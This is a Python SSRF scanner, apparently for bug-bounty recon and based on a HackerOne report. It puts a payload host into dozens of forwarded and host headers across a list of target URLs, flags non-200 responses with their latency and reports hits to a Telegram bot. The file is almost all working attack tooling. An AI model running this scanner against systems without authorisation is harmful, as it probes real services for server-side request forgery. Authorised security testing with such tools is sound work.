#!/usr/bin/python3
#_*_ coding: utf8 _*_

#Coded by https://twitter.com/JoshuaProvoste
#Based on https://hackerone.com/reports/727330

import time
import os
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlsplit

forwarded_headers = ['Forwarded','X-Forwarded','X-Forwarded-Host','X-Forwarded-By','X-Forwarded-For','X-Forwarded-Server','X-Real-IP','X-Forwarded-Proto','X-Forwarded-For-Original','X-Forward-For','Forwarded-For-IP','X-Originating-IP','X-Forwarded-For-IP','X-Forwarded-Port','X-Remote-IP','X-Remote-Addr','X-Remote-Host','X-Server-Name','X-Client-IP','Client-Ip','X-Host','Origin','Access-Control-Allow-Origin','X-ProxyUser-Ip','X-Cluster-Client-Ip','CF-Connecting-IP','True-Client-IP','X-Backend-Host','X-BlueCoat-Via','X-From-IP','X-Gateway-Host','X-Ip','X-Original-Host','X-Original-IP','X-Original-Remote-Addr','X-Original-Url','X-Originally-Forwarded-For','X-ProxyMesh-IP','X-True-Client-IP','Proxy-Host','CF-ipcountry','Remote-addr','Remote-host','X-Backend-Server','HTTP-Host','Local-addr','X-CF-URL','Fastly-Client-IP','Home','Host-Name','Host-Liveserver','X-Client-Host','X-Clientip','X-Forwarder-For','X-Machine','X-Network-Info','X-Orig-Client','Xproxy','X-Proxy-Url','Clientip','Hosti','Incap-Client-Ip','X-User','X-Source-IP']

def dedupe_headers_case_insensitive(headers_list):
    """
    Deduplica preservando el orden.
    HTTP headers son case-insensitive, así que deduplica por .lower().
    """
    seen = set()
    out = []
    for h in headers_list:
        if not h:
            continue
        key = h.strip().lower()
        if not key or key in seen:
            continue
        seen.add(key)
        out.append(h.strip())
    return out

forwarded_headers = dedupe_headers_case_insensitive(forwarded_headers)

def escape_markdown_v2(text: str) -> str:
    """
    Escapa caracteres especiales para Telegram parse_mode=MarkdownV2.
    Referencia rápida: Telegram MarkdownV2 requiere escapar varios símbolos.
    """
    if text is None:
        return ""
    # Importante: primero escapar backslash
    text = text.replace("\\", "\\\\")
    # Caracteres a escapar en MarkdownV2
    for ch in ["_", "*", "[", "]", "(", ")", "~", "`", ">", "#", "+", "-", "=", "|", "{", "}", ".", "!"]:
        text = text.replace(ch, f"\\{ch}")
    return text


def bot_telegram(bot_message, bot_token, bot_id):
    """
    Envía mensaje a Telegram de forma más segura/estable:
    - POST (no GET)
    - Sin querystring manual
    - timeout
    - Escape para MarkdownV2
    """
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            "chat_id": bot_id,
            "text": escape_markdown_v2(bot_message),
            "parse_mode": "MarkdownV2",
            "disable_web_page_preview": True,
        }
        # timeout corto para que no congele el scan si Telegram está lento
        return requests.post(url, json=payload, timeout=5)
    except Exception:
        # No tumbar el scan si Telegram falla
        return None
def stderr_log(target, e):
    line = f"[-] Unexpected error with this URL: {target} Error: {e}\n"
    with open('stderr_log_ssrf.txt', 'a', encoding='utf-8', errors='replace') as log:
        log.write(line)
    print(line.rstrip("\n"))
def stdout_log(status_code, ssrf, target, elapsed=None):
    if status_code == '429':
        prefix = "[!] Rate limit detected!"
    else:
        prefix = "[+] Possible SSRF Found!"

    if elapsed is not None:
        line = f"{prefix} Status: {status_code} Elapsed: {elapsed:.3f}s Header: {ssrf} URL: {target}\n"
    else:
        line = f"{prefix} Status: {status_code} Header: {ssrf} URL: {target}\n"

    with open('stdout_log_ssrf.txt', 'a', encoding='utf-8', errors='replace') as log:
        log.write(line)
    print(line.rstrip("\n"))
def load_headers_from_file(headers_path: str) -> dict:
    """
    Lee un archivo .txt con headers en formato:
      Header-Name: value
    - Soporta valores con ':' (usa partition / split 1 vez)
    - NO elimina espacios internos del valor (solo strip)
    - Ignora líneas vacías o sin ':'
    """
    headers = {}
    with open(headers_path, 'r', encoding='utf-8', errors='replace') as f:
        for raw_line in f:
            line = raw_line.strip()
            if not line or ":" not in line:
                continue

            name, sep, value = line.partition(":")
            if sep != ":":
                continue

            name = name.strip()
            value = value.strip()

            if not name:
                continue

            headers[name] = value

    return headers

def run_scan(
    bot_token, bot_id,
    target_list, forwarded_headers, base_headers,
    payload, timeout, verify_tls,
    fast_threshold, slow_threshold
):
    """
    Ejecuta el escaneo sin mutar el dict global de headers.
    - headers = base_headers.copy() por request
    - mide elapsed con time.monotonic()
    - reusa conexiones con requests.Session()
    - reporta cualquier status != 200
    - si llega 429: lo reporta y luego aborta
    - NO sigue redirects (para poder reportar 3xx siempre)
    - NO pisa 'Host' si ya viene en base_headers (archivo)
    """
    with requests.Session() as session:
        for target in target_list:
            for ssrf in forwarded_headers:
                try:
                    headers = base_headers.copy()

                    parsed = urlsplit(target)
                    host_value = parsed.netloc
                    if not host_value:
                        host_value = target.split('/')[2]

                    # Solo setear Host si NO viene desde el archivo de headers
                    if not headers.get('Host'):
                        headers['Host'] = host_value

                    headers['Referer'] = target
                    headers[ssrf] = payload

                    start = time.monotonic()
                    r = session.get(
                        url=target,
                        headers=headers,
                        verify=verify_tls,
                        allow_redirects=False,
                        timeout=timeout
                    )
                    elapsed = time.monotonic() - start

                    status_code = str(r.status_code)

                    if elapsed >= slow_threshold:
                        speed_tag = "SLOW"
                    elif elapsed <= fast_threshold:
                        speed_tag = "FAST"
                    else:
                        speed_tag = "MID"

                    prefix = "[!] Rate limit detected!" if status_code == '429' else "[!] Possible SSRF Found!"

                    if status_code != '200':
                        stdout_log(status_code, ssrf, target, elapsed=elapsed)
                        bot_telegram(
                            prefix +
                            ' Status: ' + status_code +
                            ' Elapsed: ' + f'{elapsed:.3f}' + 's' +
                            ' (' + speed_tag + ')' +
                            ' Header: ' + ssrf +
                            ' URL: ' + target,
                            bot_token, bot_id
                        )

                    if status_code == '429':
                        print('[-] Rate limit exception. Good bye!')
                        bot_telegram('[-] Scan aborted by 429 Rate limit.', bot_token, bot_id)
                        raise SystemExit(1)

                except KeyboardInterrupt:
                    print('Good bye!')
                    raise SystemExit(0)

                except requests.exceptions.RequestException as e:
                    e = str(e)
                    stderr_log(target, e)
                    bot_telegram('[-] Unexpected error: ' + e, bot_token, bot_id)

                except Exception as e:
                    e = str(e)
                    stderr_log(target, e)
                    bot_telegram('[-] Unexpected error: ' + e, bot_token, bot_id)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-H','--headers', type=str, required=True, help='Readable file with custom HTTP headers for browser and session emulation')
    parser.add_argument('-T','--target', type=str, required=True, help='Readable file with multiple URLs previously validated')

    parser.add_argument('--timeout', type=float, default=5.0, help='Request timeout in seconds (default: 5)')
    parser.add_argument('--payload', type=str, default='fake.tld', help='Payload value to inject in forwarded headers (default: fake.tld)')

    # TLS flags (default: verify=True). --verify se mantiene por compatibilidad.
    tls_group = parser.add_mutually_exclusive_group()
    tls_group.add_argument('--verify', action='store_true', help='(Deprecated) TLS verification is enabled by default')
    tls_group.add_argument('--insecure', action='store_true', help='Disable TLS certificate verification')

    parser.add_argument('--fast-threshold', type=float, default=3.0, help='Latency threshold (s) considered FAST (default: 3)')
    parser.add_argument('--slow-threshold', type=float, default=5.0, help='Latency threshold (s) considered SLOW (default: 5)')

    args = parser.parse_args()

    bot_token = os.environ.get('bot_token')
    bot_id = os.environ.get('bot_id')

    if bot_token is None or bot_id is None:
        print('[-] This app requires 2 variable environments (token and id) for Telegram notifications. Example: export bot_token=token / export bot_id=id')
        return 1

    # Default seguro: verify=True, a menos que --insecure
    verify_tls = not args.insecure

    # Silenciar warnings SOLO si estamos en insecure
    if not verify_tls:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    # headers base (desde archivo)
    file_headers_dict = load_headers_from_file(args.headers)

    # targets (desde archivo)
    with open(args.target, 'r', encoding='utf-8', errors='replace') as f:
        target_list = [x.strip() for x in f if x.strip()]

    headers_to_fuzz = forwarded_headers

    run_scan(
        bot_token, bot_id,
        target_list, headers_to_fuzz, file_headers_dict,
        args.payload, args.timeout, verify_tls,
        args.fast_threshold, args.slow_threshold
    )

    print('[+] Scan finished. Good bye!')
    bot_telegram('[+] Scan finished. Good bye!', bot_token, bot_id)
    return 0
if __name__ == "__main__":
    raise SystemExit(main())